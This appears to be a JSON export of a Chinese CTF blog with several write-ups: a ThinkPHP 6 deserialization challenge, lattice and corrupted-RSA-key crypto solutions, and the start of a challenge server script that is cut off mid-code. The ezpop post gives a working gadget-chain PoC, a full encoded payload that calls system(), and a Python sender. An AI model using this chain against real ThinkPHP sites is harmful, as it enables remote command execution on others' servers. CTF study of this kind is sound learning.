{"posts":[{"title":"2022 CISCN - ezpop","text":"两年前的意难平 前言当时 pop 链都找到了，就是打不通，hackbar 和 python 都不行，成了一个疙瘩，正好现在全面转 web 安全了，把这根刺拔了先。 题解最近渗透做多了，看到题目就想扫目录（直接访问 www.zip 就能把源码下下来，看到 app/controller/Index.php 12345678910111213141516171819202122&lt;?phpnamespace app\\controller;use app\\BaseController;class Index extends BaseController{ public function index() { return '&lt;style type=&quot;text/css&quot;&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V' . \\think\\facade\\App::version() . '&lt;br/&gt;&lt;span style=&quot;font-size:30px;&quot;&gt;14载初心不改 - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;span style=&quot;font-size:25px;&quot;&gt;[ V6.0 版本由 &lt;a href=&quot;https://www.yisu.com/&quot; target=&quot;yisu&quot;&gt;亿速云&lt;/a&gt; 独家赞助发布 ]&lt;/span&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=64890268&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;ee9b1aa918103c4fc&quot;&gt;&lt;/think&gt;'; } public function hello($name = 'ThinkPHP6') { return 'hello,' . $name; } public function test() { unserialize($_POST['a']); } } 可知路由为 Index/test，用 POST 传进参数 a，用这个 PoC 生成一个 payload，然后用 burp 发包，得到 flag。 123456789101112131415161718192021222324252627282930&lt;?phpnamespace think{ abstract class Model{ private $lazySave = false; private $data = []; private $exists = false; protected $table; private $withAttr = []; protected $json = []; protected $jsonAssoc = false; function __construct($obj = ''){ $this-&gt;lazySave = True; $this-&gt;data = ['whoami' =&gt; ['dir']]; $this-&gt;exists = True; $this-&gt;table = $obj; $this-&gt;withAttr = ['whoami' =&gt; ['system']]; $this-&gt;json = ['whoami',['whoami']]; $this-&gt;jsonAssoc = True; } }}namespace think\\model{ use think\\Model; class Pivot extends Model{ }}namespace { echo(base64_encode(serialize(new think\\model\\Pivot(new think\\model\\Pivot()))));} payload 如下： 1O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D 把 dir 换成 cat /flag 即可。 现在分析为什么我当初用 python 不行，这是我的 python 代码： 1234567891011121314import requestsurl = '&lt;url&gt;/Index/test'headers = { &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}data = { &quot;a&quot;: r&quot;O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D&quot;}res = requests.post(url, data=data, headers=headers)print(res.text) print(requests.Request('POST', url, data=data, headers=headers).prepare().body) 查看请求体后发现 payload 长这样了 1a=O%253A17%253A%2522think%255Cmodel%255CPivot%2522%253A7%253A%257Bs%253A21%253A%2522%2500think%255CModel%2500lazySave%2522%253Bb%253A1%253Bs%253A17%253A%2522%2500think%255CModel%2500data%2522%253Ba%253A1%253A%257Bs%253A6%253A%2522whoami%2522%253Ba%253A1%253A%257Bi%253A0%253Bs%253A3%253A%2522dir%2522%253B%257D%257Ds%253A19%253A%2522%2500think%255CModel%2500exists%2522%253Bb%253A1%253Bs%253A8%253A%2522%2500%252A%2500table%2522%253BO%253A17%253A%2522think%255Cmodel%255CPivot%2522%253A7%253A%257Bs%253A21%253A%2522%2500think%255CModel%2500lazySave%2522%253Bb%253A1%253Bs%253A17%253A%2522%2500think%255CModel%2500data%2522%253Ba%253A1%253A%257Bs%253A6%253A%2522whoami%2522%253Ba%253A1%253A%257Bi%253A0%253Bs%253A3%253A%2522dir%2522%253B%257D%257Ds%253A19%253A%2522%2500think%255CModel%2500exists%2522%253Bb%253A1%253Bs%253A8%253A%2522%2500%252A%2500table%2522%253Bs%253A0%253A%2522%2522%253Bs%253A21%253A%2522%2500think%255CModel%2500withAttr%2522%253Ba%253A1%253A%257Bs%253A6%253A%2522whoami%2522%253Ba%253A1%253A%257Bi%253A0%253Bs%253A6%253A%2522system%2522%253B%257D%257Ds%253A7%253A%2522%2500%252A%2500json%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A6%253A%2522whoami%2522%253Bi%253A1%253Ba%253A1%253A%257Bi%253A0%253Bs%253A6%253A%2522whoami%2522%253B%257D%257Ds%253A12%253A%2522%2500%252A%2500jsonAssoc%2522%253Bb%253A1%253B%257Ds%253A21%253A%2522%2500think%255CModel%2500withAttr%2522%253Ba%253A1%253A%257Bs%253A6%253A%2522whoami%2522%253Ba%253A1%253A%257Bi%253A0%253Bs%253A6%253A%2522system%2522%253B%257D%257Ds%253A7%253A%2522%2500%252A%2500json%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A6%253A%2522whoami%2522%253Bi%253A1%253Ba%253A1%253A%257Bi%253A0%253Bs%253A6%253A%2522whoami%2522%253B%257D%257Ds%253A12%253A%2522%2500%252A%2500jsonAssoc%2522%253Bb%253A1%253B%257D 也就是说，它又被 urlencode 了一次，所以应该直接写成如下形式： 1data = &quot;a=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D &quot; 源码分析跟进 requests.Request，可以看到如下代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677def prepare_body(self, data, files, json=None): &quot;&quot;&quot;Prepares the given HTTP body data.&quot;&quot;&quot; # Check if file, fo, generator, iterator. # If not, run through normal process. # Nottin' on you. body = None content_type = None if not data and json is not None: # urllib3 requires a bytes-like body. Python 2's json.dumps # provides this natively, but Python 3 gives a Unicode string. content_type = &quot;application/json&quot; try: body = complexjson.dumps(json, allow_nan=False) except ValueError as ve: raise InvalidJSONError(ve, request=self) if not isinstance(body, bytes): body = body.encode(&quot;utf-8&quot;) is_stream = all( [ hasattr(data, &quot;__iter__&quot;), not isinstance(data, (basestring, list, tuple, Mapping)), ] ) if is_stream: try: length = super_len(data) except (TypeError, AttributeError, UnsupportedOperation): length = None body = data if getattr(body, &quot;tell&quot;, None) is not None: # Record the current file position before reading. # This will allow us to rewind a file in the event # of a redirect. try: self._body_position = body.tell() except OSError: # This differentiates from None, allowing us to catch # a failed `tell()` later when trying to rewind the body self._body_position = object() if files: raise NotImplementedError( &quot;Streamed bodies and files are mutually exclusive.&quot; ) if length: self.headers[&quot;Content-Length&quot;] = builtin_str(length) else: self.headers[&quot;Transfer-Encoding&quot;] = &quot;chunked&quot; else: # Multi-part file uploads. if files: (body, content_type) = self._encode_files(files, data) else: if data: body = self._encode_params(data) if isinstance(data, basestring) or hasattr(data, &quot;read&quot;): content_type = None else: content_type = &quot;application/x-www-form-urlencoded&quot; self.prepare_content_length(body) # Add content-type if it wasn't explicitly provided. if content_type and (&quot;content-type&quot; not in self.headers): self.headers[&quot;Content-Type&quot;] = content_type self.body = body 可以看到，data 参数会被 self._encode_params 处理，再看 self._encode_params： 1234567891011121314151617181920212223242526272829@staticmethoddef _encode_params(data): &quot;&quot;&quot;Encode parameters in a piece of data. Will successfully encode parameters when passed as a dict or a list of 2-tuples. Order is retained if data is a list of 2-tuples but arbitrary if parameters are supplied as a dict. &quot;&quot;&quot; if isinstance(data, (str, bytes)): return data elif hasattr(data, &quot;read&quot;): return data elif hasattr(data, &quot;__iter__&quot;): result = [] for k, vs in to_key_val_list(data): if isinstance(vs, basestring) or not hasattr(vs, &quot;__iter__&quot;): vs = [vs] for v in vs: if v is not None: result.append( ( k.encode(&quot;utf-8&quot;) if isinstance(k, str) else k, v.encode(&quot;utf-8&quot;) if isinstance(v, str) else v, ) ) return urlencode(result, doseq=True) else: return data 其中 @staticmethod 修饰的方法是静态方法，就是可以直接通过类名调用，不需要实例化。可以看到，data 参数会被 urlencode 处理，这就是当年失败的原因。","link":"/2024/06/05/2022%20CISCN%20-%20ezpop/"},{"title":"2022 强网杯 Crypto","text":"当场做是做不出来的，赛后分析学学吧，不定期更新 Lattice1234567891011121314151617181920212223242526272829303132from sage.modules.free_module_integer import IntegerLatticefrom Crypto.Cipher import AESfrom base64 import b64encodefrom hashlib import *from secret import flagimport signaln = 75m = 150r = 10N = 126633165554229521438977290762059361297987250739820462036000284719563379254544315991201997343356439034674007770120263341747898897565056619503383631412169301973302667340133958109def gen(n, m, r, N): t1 = [ZZ.random_element(-2^15, 2^15) for _ in range(n*m)] t2 = [ZZ.random_element(N) for _ in range(r*n)] B = matrix(ZZ, n, m, t1) # B为75*150的矩阵 L = IntegerLattice(B) A = matrix(ZZ, r, n, t2) # A为10*75的矩阵 C = (A * B) % N # C为10*150的矩阵 return L, Cdef pad(s): return s + (16 - len(s) % 16) * b&quot;\\x00&quot;signal.alarm(60)token = input(&quot;team token:&quot;).strip().encode()L, C = gen(n, m, r, N)print(C)key = sha256(str(L.reduced_basis[0]).encode()).digest()aes = AES.new(key, AES.MODE_ECB)ct = b64encode(aes.encrypt(pad(flag))).decode()print(ct) 题目生成了一个元素在 $[-2^{15},2^{15}]$ 间的矩阵 $B_{75\\times150}$ ，和 $Z_N$ 上的矩阵 $A_{10\\times75}$ 。然后给了一个两矩阵相乘再模 $N$ 的结果 $C$ ，即 $C=AB\\pmod N$ ，需要我们恢复出原来格$B$的最短向量。 比赛时尝试过构造 $\\left[ C \\enspace NI\\right]^T$ ，跑LLL出来的结果很差， BKZ 的话一晚上啥也没出来。。赛后只找到 Nu1L 队的 wp ，but 也只有个 exp ，一句解释都没，像我这样的菜鸡分析起来就十分吃力了，但聊胜于无嘛，其他几个队连个 wp 都不放呜呜呜。 exp 中构造了一个 $m+r=150+10=160$ 维的方阵 $A$ 如下：$$A=\\left(\\begin{array}{cccc|cccc}1 &amp; 0 &amp; \\cdots &amp; 0 &amp; 2^{200}\\cdot c_{0,0} &amp; 2^{200}\\cdot c_{1,0} &amp; \\cdots &amp; 2^{200}\\cdot c_{9,0} \\\\0 &amp; 1 &amp; \\cdots &amp; 0 &amp; 2^{200}\\cdot c_{0,1} &amp; 2^{200}\\cdot c_{1,1} &amp; \\cdots &amp; 0 \\\\\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; 0 \\\\0 &amp; 0 &amp; \\cdots &amp; 1 &amp; 2^{200}\\cdot c_{0,149} &amp; 2^{200}\\cdot c_{1,149} &amp; \\cdots &amp; 2^{200}\\cdot c_{9,149} \\\\ \\hline0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 2^{200}\\cdot N &amp; 0 &amp; \\cdots &amp; 0 \\\\0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0 &amp; 2^{200}\\cdot N &amp; \\cdots &amp; 0 \\\\\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 2^{200}\\cdot N\\end{array}\\right)$$可以看到 $A$ 左上角为一个 $150$ 维的单位阵，左下角为零阵，右上角为 $C$ 的转置数乘 $2^{200}$ ，右下角为一个 $10$ 维的单位阵数乘 $2^{200}\\cdot N$ ，这里乘不乘 $2^{200}$ 得到的结果都是一样的，但神奇的是不乘的话 LLL 耗时会长一些。$A$ 跑一遍 LLL 后，取结果的左上角 $75\\times150$ 矩阵，记为 $B$ ，取 $B$ 的核记为 $D$ ，最后 $D$ 跑一遍 BKZ 后的最短向量即为所求。 这里涉及到矩阵的核的概念，核也叫矩阵的零空间，比如 $M$ 的核是方程 $Mx=0$ 的所有解 $x$ 的集合。 那么就不难看出有 $BD^T=O$ ，即 $B^TD=O$至于 $C$ 为什么左边要拼接一个单位阵，回忆你已经遗忘的线性代数，这种操作是不是似曾相识？没错说的就是矩阵的求逆，求逆矩阵除了伴随矩阵法，还有一种方法就是初等变换法。例如如下一个矩阵求逆$$M=\\begin{pmatrix}1 &amp; -4 &amp; -3 \\\\1 &amp; -5 &amp; -3 \\\\-1 &amp; 6 &amp; 4\\end{pmatrix}$$在右边补上一个单位阵，得到$$A=\\left(\\begin{array}{ccc|ccc}1 &amp; -4 &amp; -3 &amp; 1 &amp; 0 &amp; 0 \\\\1 &amp; -5 &amp; -3 &amp; 0 &amp; 1 &amp; 0 \\\\-1 &amp; 6 &amp; 4 &amp; 0 &amp; 0 &amp; 1\\end{array}\\right)\\stackrel{初等行变换}{\\longrightarrow}\\left(\\begin{array}{ccc|ccc}1 &amp; 0 &amp; 0 &amp; 2 &amp; 2 &amp; 3 \\\\0 &amp; 1 &amp; 0 &amp; 1 &amp; -1 &amp; 0 \\\\0 &amp; 0 &amp; 1 &amp; -1 &amp; 2 &amp; 1\\end{array}\\right)$$此时右边的矩阵 $M^{-1}$ 即为所求究其原理，在进行初等行变换的时候，右边的矩阵“记录”下了我们的操作，可以表示为$$M^{-1}\\left[ M\\enspace I\\right] =\\left[ I\\enspace M^{-1}\\right]$$回到题目中来，有$$L\\left[ I \\enspace C^T\\right] \\enspace % \\enspace N=\\left[\\begin{matrix} B &amp; O \\\\ R &amp; S\\end{matrix}\\right]$$至于右上角为何是一个 $75\\times10$ 的零阵，我也不知道，但 exp 既然这么断言，姑且就这么认为先，那么我们就推测$$L=\\left[\\begin{matrix} B \\\\ R\\end{matrix}\\right],LC^T=\\left[\\begin{matrix} O \\\\ S\\end{matrix}\\right]\\pmod N$$即有$$\\left[\\begin{matrix} B \\\\ R\\end{matrix}\\right]C^T=\\left[\\begin{matrix} O \\\\ S\\end{matrix}\\right]\\pmod N$$得到 $BC^T=O\\pmod N$ ，结合上面 $BD^T=O$ ，推测。。。推测不出来了，然后结合队里大手子的分析如下 记题目中给出的两个矩阵为 $\\mathcal{A}$和$\\mathcal{B}$ ，有 $\\mathcal{A}\\mathcal{B} = C\\pmod N$若有 $B(\\mathcal{A}\\mathcal{B})^T = BC^T = O\\pmod N$ ，则 $B$ 和 $C^T$ 互为左右零空间。因此可以通过构造格 $L$ ，使得对格 $L$ 进行格基规约后可以得到一组基 $B$ 满足 $BC^T = O\\pmod N$ ，即 $B$ 的基就是 $C^T$ 在模 $N$ 下的一个左零空间。接下来对 $B$ 求解其零空间 $D^T$ 就得到了 $(\\mathcal{A}\\mathcal{B})^T$ 所在的那个空间上了，这里从有限域化为整数域，即 $D=\\mathcal{A}\\mathcal{B}$ ，然后因为 $\\mathcal{B}$ 中所求的行向量是一个短向量，且矩阵 $D^T$ 的行向量是 $\\mathcal{B}$ 的行向量的线性组合，因此对 $D^T$ 进行格基规约算法就可以把 $\\mathcal{B}$ 的短向量给恢复出来。 至此已经有明悟的感觉，但仍是有少许不解，消化一段时间吧。","link":"/2022/08/08/2022%20%E5%BC%BA%E7%BD%91%E6%9D%AF%20Crypto/"},{"title":"2022 蓝帽杯 - corrupted_key","text":"很有意思的一道题，涉及私钥文件的结构 题目给了一个 priv.pem 123456789101112131415-----BEGIN RSA PRIVATE KEY-----MIICXgIBAAKBgQDXFSUGqpzsBeUzXWtG9UkUB8MZn9UQkfH2Aw03YrngP0nJ3NwHUFTgzBSLl0tBhUvZO07haiqHbuYgBegO+Aa3qjtksb+bH6dz41PQzbn/l4Pd1fXmdJmtEPNh6TjQC4KmpMQqBTXF52cheY6GtFzUuNA7DX51wr6HZqHoQ73GQQIDAQAByQvOzxy6szWFheigQdGxAkEA4wFss2CcHWQ8FnQ5w7k4uIH0I38khg07HLhaYm1czUcmlk4PgnDWxN+ev+vMU45O5eGntzaO3lHsaukX9461mA==-----END RSA PRIVATE KEY----- 和一个加密的脚本 1234567from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_OAEPfrom secret import flagkey = RSA.generate(1024)open(&quot;flag.enc&quot;,'wb').write(PKCS1_OAEP.new(key.publickey()).encrypt(flag))open('priv.pem','wb').write(key.exportKey('PEM')) 然后就是 flag.enc 分析数理部分题目名为 corrupted_key ，意为残损的私钥文件，既然是残损的，那么剩下的部分就是解题的关键了。通过查看 Crypto.PublicKey.RSA 的源码，发现私钥文件的结构是： 123456780 （注意！！！！）nepqd mod (p-1)d mod (q-1)(inverse of q) mod p 完整来说是 123456789101112RSAPrivateKey ::= SEQUENCE {version Version,modulus INTEGER, -- npublicExponent INTEGER, -- eprivateExponent INTEGER, -- dprime1 INTEGER, -- pprime2 INTEGER, -- qexponent1 INTEGER, -- d mod (p-1)exponent2 INTEGER, -- d mod (q-1)coefficient INTEGER, -- (inverse of q) mod potherPrimeInfos OtherPrimeInfos OPTIONAL} 一通操作后发现可以拿到 $n$,$e$,CRT 系数（即 $q^{-1}\\mod p$ ）和 $d_q$ 低位，至于怎么拿到的等下再说，这里可以构造等式如下：$$ t = q^{-1} \\pmod p \\\\ tq-1 = 0 \\pmod p \\\\ tq^2 - q = 0 \\pmod n$$然后$$ ed_q = 1 \\pmod{q-1} \\\\ ed_q - 1 = k(q - 1) \\\\ f = (dq_h + dq_l)e - 1 + k = kq$$代入得$$ tf^2 - kf = 0 \\pmod n$$显然 $k$ 和 $e$ 数量级是相当的， $dq_h$ 的未知高位有512-120=392位，就可以通过 coppersmith 爆破 $k$ 。 参数提取然后就是有意思的部分了，如何从残损的私钥文件中提取参数呢？对着源码一顿调试了几个钟（太菜了呜呜），发现是先将各个参数塞进一个首位为 0 的数组，然后各个参数前面补上长度，后面 long_to_bytes 转换成 bytes ，最后拼接起来。我的提取脚本如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from binascii import a2b_base64from Crypto.Util.asn1 import DerIntegerfrom Crypto.Util.number import *pem = '''-----BEGIN RSA PRIVATE KEY-----MIICXgIBAAKBgQDXFSUGqpzsBeUzXWtG9UkUB8MZn9UQkfH2Aw03YrngP0nJ3NwHUFTgzBSLl0tBhUvZO07haiqHbuYgBegO+Aa3qjtksb+bH6dz41PQzbn/l4Pd1fXmdJmtEPNh6TjQC4KmpMQqBTXF52cheY6GtFzUuNA7DX51wr6HZqHoQ73GQQIDAQAByQvOzxy6szWFheigQdGxAkEA4wFss2CcHWQ8FnQ5w7k4uIH0I38khg07HLhaYm1czUcmlk4PgnDWxN+ev+vMU45O5eGntzaO3lHsaukX9461mA==-----END RSA PRIVATE KEY-----'''pemlist = pem.split('\\n')decode_b64 = b''for i in pemlist[1:-1]: decode_b64+=a2b_base64(i)decode_b64 = decode_b64[4:] # 丢弃前4个字节der_int = DerInteger()# 提取nn = decode_b64[3:135]der_int.decode(n)print('[+] n =',n:=der_int.value)# 提取ee = decode_b64[135:140]der_int.decode(e)print('[+] e =',e:=der_int.value)# 提取CRT系数for len in range(1,300): try: q_inv_p = decode_b64[-len:] der_int.decode(q_inv_p) print('[+] q_inv_p =',q_inv_p:=der_int.value) except: len+=1 else: # print(len) # 67 break# print(q_inv_p.bit_length()) # 512# 提取dp低位dp_l = decode_b64[-82:-67]# print(dp_l)print('[+] dp_l =',bytes_to_long(dp_l)) 可以看到我一开始直接把前 4 个字节丢了，然后在新 List 里用库函数解析 3 - 134 号位的数据，这部分就是属于 $n$ 的，然而实际上 bytes_to_long 解析 7 - 134 号位的数据得到的也是 $n$ ，那么问题来了， 3 - 6 号位这 4 个字节里放了啥？ 以下是新List： 1\\x02\\x01\\x00\\x02\\x81\\x81\\x00\\xd7\\x15%\\x06\\xaa\\x9c... 这里涉及一个ASN.1（Abstract Syntax Notation dot one，即抽象记法1）的问题，简单来说就是将数据编码成 3 个部分：标志域、长度域、值域标志域中，约定 02 表示整数长度域稍微复杂些，记录的是值域的长度，分为定长和不定长两种情况定长时，若值域长度不超过 127 ，则用短格式表示，也就是直接用 16 进制表示，比如长度为 31 就是 0x1F ，即 0001 1111 ；若长度超过 127 ，则用长格式表示，首字节的首位置 1 表示长格式，后面7位则表示后面再跟多少个表示长度的字节，比如 1000 0001 表示后面 1 个字节表示长度，后面的长度也是直接用 16 进制表示。现在可以看到新 List 中， 0 号位为 02 表示整数， 1 号位 01 表示长度为 1 ， 2 号位 00 表示数据为 0 ，这就是上面提到的私钥文件结构中的那个 0 。再继续分析， 3 号位 02 表示数据为整数， 4 号位中的首比特为1表示使用长格式，后面 7 个比特为 000 0001 意为数据长度用 1 个字节表示，没错就是后面紧跟的 5 号位，表示数据长度为 0x81 ，转换成 10 进制就是 129 ，试了一下 6 - 134 号位用 bytes_to_long 解析出来的数据，也是 $n$那么现在你应该也可以尝试写出 $e$ 的编码： 1\\x02\\x03\\x01\\x00\\x01 细心的你还发现我开头扔了 4 个字节，猜猜是啥呢？答案是整个私钥文件编码后作为值域前面补的标签域和长度域，最前面再补一个 0 ，也就是 10\\x82\\x02^ 后两个字节 bytes_to_long 解码后是 606 ，恰为后面跟的完整数据的长度 后来偶然间发现竟然有类似的题目（）0CTF 2016 Quals equation 参考https://mp.weixin.qq.com/s/A9OmgHAmGLJPEL4cQBU8zQhttps://www.likecs.com/show-40060.html","link":"/2022/07/16/2022%20%E8%93%9D%E5%B8%BD%E6%9D%AF%20-%20corrupted_key/"},{"title":"2024 强网杯决赛 - st","text":"SB 题 misc 搞一搞变成 re，然后塞到 crypto 里面，啥卵出题人的嘛嘛炸了。 题目给一个 encrypt 和生成的密文 data.bin，然后让你解。 分析首先 IDA 打开看一下，哎您猜怎么着，依托答辩，除了一开始的 MT19937 能瞪出来，后面一堆迷惑操作根本不知道在搞什么飞机这时需要选手稍微顿悟一下，猜出这是隐写算法 Syndrome-Trellis Codes // TODOGao 了半天没 Gao 出来，我符号表都快还原到最底层了也没瞪出来他除了参数 h 还改了什么，有空再补。","link":"/2024/12/09/2024%20%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%86%B3%E8%B5%9B%20-%20st/"},{"title":"2024 强网拟态决赛 Crypto","text":"特种兵 CTF 南京站，就打了两道密码，写一下 notiv题目task.py 如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112# !/usr/bin/env pythonfrom hashlib import sha256import socketserverimport osimport sysimport randomimport signalimport stringfrom hashlib import sha256from mypad import *from Crypto.Cipher import AESfrom random import *from Crypto.Util.number import *class Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b'' while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) &lt; BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): try: if newline: msg += b'\\n' self.request.sendall(msg) except: pass def recv(self, prompt=b'&gt; '): self.send(prompt, newline=False) return self._recvall() def close(self): self.request.close() def proof_of_work(self): seed(os.urandom(8)) proof = ''.join( [choice(string.ascii_letters+string.digits) for _ in range(20)]) _hexdigest = sha256(proof.encode()).hexdigest() self.send(f&quot;[+] sha256(XXXX+{proof[4:]}) == {_hexdigest}&quot;.encode()) x = self.recv(prompt=b'[+] Plz tell me XXXX: ') if len(x) != 4 or sha256(x+proof[4:].encode()).hexdigest() != _hexdigest: return False return True def handle(self): try: if not self.proof_of_work(): self.send(b&quot;try again!&quot;) self.close() exit() #signal.alarm(120) count = 0 for _ in range(50): seed(os.urandom(8)) key = pad_x923(b&quot;&quot;) chal = hex(getrandbits(64*3))[2:].zfill(16*3) for i in range(200): iv = long_to_bytes(getrandbits(128)).rjust(16, b&quot;\\00&quot;) cipher = AES.new(key, AES.MODE_CBC, iv) test = self.recv(b&quot;:&gt; &quot;).decode() tb = bytes.fromhex(test) ret = cipher.encrypt(pad_x923(tb)) if len(ret) &gt; 16: 